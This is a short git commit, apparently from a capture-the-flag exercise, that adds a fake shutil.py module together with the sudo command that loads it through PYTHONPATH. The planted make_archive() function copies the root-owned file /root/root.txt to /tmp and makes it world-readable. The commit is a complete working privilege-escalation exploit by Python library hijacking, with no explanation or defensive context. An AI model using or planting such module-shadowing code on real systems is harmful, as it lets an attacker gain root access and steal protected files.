4d576b8b68579c3a36b7889bc7b3de3c1827807c
Fsjl <fredric.sjl@gmail.com>
2020-05-20 18:00:42 +0700

    Create shutil.py
    sudo PYTHONPATH=/tmp/youpath /opt/scripts/admin_tasks.sh

---
+++ shutil.py
@@ -0,0 +1,12 @@
+#!/usr/bin/python3
+
+import os
+
+def make_archive():
+
+        os.system('cp /root/root.txt /tmp/youpath/root.txt')
+        os.system('chmod 777 /tmp/youpath/root.txt')
+
+        print('done')
+
+make_archive()
